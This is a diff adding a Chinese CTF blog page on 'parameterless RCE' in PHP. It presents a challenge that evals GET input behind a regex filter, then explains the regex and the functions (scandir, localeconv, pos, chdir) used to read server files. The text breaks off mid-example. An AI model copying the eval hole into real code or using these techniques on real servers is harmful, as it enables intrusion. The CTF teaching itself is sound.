@@ -1,0 +1,1549 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="无参数RCE, 潜心">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>无参数RCE | 潜心</title>
+    <link rel="icon" type="image/png" href="/medias/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">潜心</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags/web/">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Web</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/misc/">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Misc</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/crypto/">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Crypto</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/writeup/">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Write up</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/Notes/" class="waves-effect waves-light">
+      
+      <i class="fas fa-graduation-cap" style="zoom: 0.6;"></i>
+      
+      <span>学习笔记</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">潜心</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			CTF
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags/web/ " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-book" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Web</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/tags/misc/ " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-book" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Misc</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/tags/crypto/ " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-book" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Crypto</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/tags/writeup/ " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-book" style="position: absolute;left:28px" ></i>
+			      
+		          <span>Write up</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/Notes/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-graduation-cap"></i>
+			
+			学习笔记
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">无参数RCE</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-12-03
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    11 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>无参数RCE：只使用函数，且函数不能带有参数</p>
+<span id="more"></span>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ul>
+<li>语法：</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">mixed</span> <span class="token function">preg_replace </span><span class="token punctuation">(</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$replacement</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$subject</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$count</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>pattern</code>：要搜索的模式，可以是字符串或一个字符串数组</p>
+<p><code>replacement</code>：用于替换的字符串或字符串数组</p>
+<p><code>subject</code>：要搜索替换的目标字符串或字符串数组</p>
+<p><code>limit</code>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</p>
+<p><code>count</code>：可选，为替换执行的次数</p>
+<ul>
+<li>简化为：</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> replacement<span class="token punctuation">,</span> subject<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>即：将<code>subject</code>中符合<code>pattern</code>的替换为<code>replacement</code></p>
+<p>对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p>
+<p>意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串</p>
+<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式（Regular Expression）描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'01ABcdEf_230G'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/0/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'A'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token comment">//将0换成A</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉所有数字</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉所有小写字母</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[A-Z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉所有大写字母</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^A-Z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment">//去掉除了大写字母外所有的字符</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z A-Z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>	<span class="token comment">//去掉所有大小写字母</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>A1ABcdEf_23AG<br>ABcdEf_G<br>01ABE_230G<br>01cdf_230<br>ABEG<br>01_230<br></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcABC123_+-*/"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\W]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;hr>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'!'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>!!!!!!!!!!+-<em>/<br>abcABC123_!!!!<br>!!!!!!!!!!+-</em>/<br></p>
+</blockquote>
+<p><code>\w</code>：匹配字母、数字、下划线。等价于<code>[A-Z a-z 0-9 _]</code></p>
+<p><code>\W</code>：匹配非字母、数字、下划线。等价于<code>[^A-Z a-z 0-9 _]</code></p>
+<p>而<code>(?R)</code>是引用当前表达式的意思，即可以用<code>/[^\W]+\((?R)?\)/</code>替换到<code>(?R)</code>的位置</p>
+<p><code>(?R)?</code> 这里多一个?表示可以有引用，也就是说可以衍生匹配。</p>
+<p>即：<code>(?R)?</code>表示递归整个匹配模式</p>
+<p>所以<code>/[^\W]+\((?R)?\)/</code>合起来就是匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配<code>字符串+()</code>的类型，并且括号内为<code>空字符串</code>或<code>字符串+()</code>。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p>
+<p>像<code>fun1(fun2(fun3()))</code>最终会被替换为空</p>
+<p>而<code>fun1(fun2(fun3(aaa)))</code>则不会进行替换，结果仍为<code>fun1(fun2(fun3(aaa)))</code></p>
+<p><img src="https://s3.ax1x.com/2020/11/26/DBRnKg.png"></p>
+<br>
+
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h3><p>扩展：highlight_file() 高亮读取文件</p>
+<pre class="line-numbers language-none"><code class="language-none">show_source()函数对文件进行语法高亮提示
+show_source(filename,return)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">filename</td>
+<td align="left">必需。要进行高亮处理的 PHP 文件的路径。</td>
+</tr>
+<tr>
+<td align="left">return</td>
+<td align="left">可选。如果设置 true，则本函数返回高亮处理的代码。</td>
+</tr>
+</tbody></table>
+<ul>
+<li>test.php</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;hr>"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/08/17/dZ6b9J.png"></p>
+<h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h3><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，且第一个元素为点（.)。</p>
+<p>localeconv() 函数会返回以下数组元素：</p>
+<ul>
+<li>[decimal_point] - 小数点字符</li>
+<li>[thousands_sep] - 千位分隔符</li>
+<li>[int_curr_symbol] - 货币符号 （例如：USD）</li>
+<li>[currency_symbol] - 货币符号 （例如：$）</li>
+<li>[mon_decimal_point] - 货币小数点字符</li>
+<li>[mon_thousands_sep] - 货币千位分隔符</li>
+<li>[positive_sign] - 正值字符</li>
+<li>[negative_sign] - 负值字符</li>
+<li>[int_frac_digits] - 国际通用小数位</li>
+<li>[frac_digits] - 本地通用小数位</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>array(18) {<br>  [“decimal_point”]=&gt;<br>  string(1) “.”<br>  [“thousands_sep”]=&gt;<br>  string(0) “”<br>  [“int_curr_symbol”]=&gt;<br>  string(0) “”<br>  [“currency_symbol”]=&gt;<br>  string(0) “”<br>  [“mon_decimal_point”]=&gt;<br>  string(0) “”<br>  [“mon_thousands_sep”]=&gt;<br>  string(0) “”<br>  [“positive_sign”]=&gt;<br>  string(0) “”<br>  [“negative_sign”]=&gt;<br>  string(0) “”<br>  [“int_frac_digits”]=&gt;<br>  int(127)<br>  [“frac_digits”]=&gt;<br>  int(127)<br>  [“p_cs_precedes”]=&gt;<br>  int(127)<br>  [“p_sep_by_space”]=&gt;<br>  int(127)<br>  [“n_cs_precedes”]=&gt;<br>  int(127)<br>  [“n_sep_by_space”]=&gt;<br>  int(127)<br>  [“p_sign_posn”]=&gt;<br>  int(127)<br>  [“n_sign_posn”]=&gt;<br>  int(127)<br>  [“grouping”]=&gt;<br>  array(0) {<br>  }<br>  [“mon_grouping”]=&gt;<br>  array(0) {<br>  }<br>}</p>
+</blockquote>
+<h3 id="pos"><a href="#pos" class="headerlink" title="pos()"></a>pos()</h3><p>pos() 函数返回数组中的当前元素的值（取第一个元素）。</p>
+<p>该函数是 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> 函数的别名。</p>
+<p>如果pos()和current()都被过滤了，可以使用reset()。</p>
+<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
+<p>相关的方法：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> - 返回数组中的当前元素的值</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+<h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>scandir() 函数返回指定目录中的文件和目录的数组。</p>
+<pre class="line-numbers language-none"><code class="language-none">scandir(directory,sorting_order,context);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>directory</em></td>
+<td align="left">必需。规定要扫描的目录。</td>
+</tr>
+<tr>
+<td align="left"><em>sorting_order</em></td>
+<td align="left">可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td>
+</tr>
+<tr>
+<td align="left"><em>context</em></td>
+<td align="left">可选。规定目录句柄的环境。<em>context</em> 是可修改目录流的行为的一套选项。</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'D:\ant'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/08/17/dZgcyn.png"></p>
+<h3 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h3><p>chr() 函数从指定的 ASCII 值返回字符。</p>
+<p>ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x；</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment">// 十进制</span>
+<span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">061</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment">// 八进制值</span>
+<span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment">// 十六进制值</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>=<br>1<br>a<br></p>
+</blockquote>
+<h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录，相当于在命令行输入cd..会返回上一级目录。</p>
+<p>DOS的Chdir（cd）命令可以显示当前目录的名称或者更改当前的目录。</p>
+<p>一般当前显示的路径是”C:\Users\Administrator”，如果想要跳转到D盘的Test文件夹(“D:\test\”)可以直接使用DOS命令<strong>cd /d d:\test</strong></p>
+<p>如果想要跳转到当前路径的上一级路径可以直接用DOS命令<strong>cd ..</strong></p>
+<p>如果想要获取cd命令的具体用法，可以直接输入<strong>cd /?</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
